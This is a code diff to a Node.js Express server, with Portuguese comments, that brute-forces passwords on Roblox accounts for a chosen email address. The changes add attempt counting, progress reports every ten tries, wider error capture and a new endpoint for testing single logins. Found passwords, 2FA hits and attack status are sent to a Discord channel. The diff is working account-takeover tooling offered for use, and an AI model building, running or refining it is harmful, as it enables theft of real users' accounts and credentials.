@@ -66,7 +66,7 @@ async function tryRobloxLogin(email, password) {
     } catch (error) {
         const status = error.response ? error.response.status : 'Sem Status';
         const data = error.response ? error.response.data : error.message;
-        return { success: false, error: `HTTP ${status}: ${JSON.stringify(data).substring(0, 150)}` };
+        return { success: false, error: `HTTP ${status}: ${JSON.stringify(data).substring(0, 300)}` };
     }
 }
 
@@ -89,9 +89,11 @@ async function startBruteForce(email) {
     await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}`);
 
     let found = false;
+    let attempts = 0;
 
     for (const password of passwords) {
         if (found) break;
+        attempts++;
 
         const result = await tryRobloxLogin(email, password);
 
@@ -101,18 +103,23 @@ async function startBruteForce(email) {
             await sendDiscordMessage(msg);
             console.log("ENCONTRADA:", password);
         } else {
-            if (result.error.includes("2FA")) {
-                await sendDiscordMessage(`**⚠️ 2FA DETECTADO**\n**Email:** ${email}\n**Senha:** ${password}\n**Erro:** ${result.error}`);
-            } else if (result.error.includes("Credenciais inválidas")) {
-                console.log(`Falha para ${password}: Credenciais inválidas`);
+            // Enviar para Discord TODOS os erros (críticos) para diagnóstico
+            // Vamos ignorar apenas "Credenciais inválidas" para não floodar, mas enviar quando for outro tipo
+            if (!result.error.includes("Credenciais inválidas")) {
+                const msg = `**⚠️ ERRO (${email} - senha ${password})**\n**Erro:** ${result.error}`;
+                await sendDiscordMessage(msg);
+                console.log(`Erro em ${password}:`, result.error);
             } else {
-                console.log(`Falha para ${password}: ${result.error}`);
-                if (result.error.includes("HTTP 429") || result.error.includes("Too Many Requests")) {
-                    await sendDiscordMessage(`**⏳ RATE LIMIT**\n**Senha:** ${password}\n**Erro:** ${result.error}`);
-                }
+                console.log(`Credenciais inválidas para: ${password}`);
+            }
+
+            // A cada 10 tentativas, enviamos um resumo para não perder o ritmo
+            if (attempts % 10 === 0) {
+                await sendDiscordMessage(`**📊 Progresso:** ${attempts}/${passwords.length} tentativas concluídas (sem sucesso ainda)`);
             }
         }
 
+        // Pausa de 2 segundos entre tentativas
         await new Promise(r => setTimeout(r, 2000));
     }
 
@@ -121,6 +128,7 @@ async function startBruteForce(email) {
     }
 }
 
+// Endpoint principal
 app.post('/start-brute-force', async (req, res) => {
     const { email } = req.body;
 
@@ -131,6 +139,17 @@ app.post('/start-brute-force', async (req, res) => {
     startBruteForce(email);
 
     return res.json({ success: true, message: "Ataque iniciado! Aguarde as notificações no Discord." });
+});
+
+// Endpoint de teste manual
+app.post('/test-login', async (req, res) => {
+    const { email, password } = req.body;
+    if (!email || !password) {
+        return res.json({ success: false, error: "Email e senha são obrigatórios" });
+    }
+
+    const result = await tryRobloxLogin(email, password);
+    return res.json(result);
 });
 
 app.listen(port, () => {
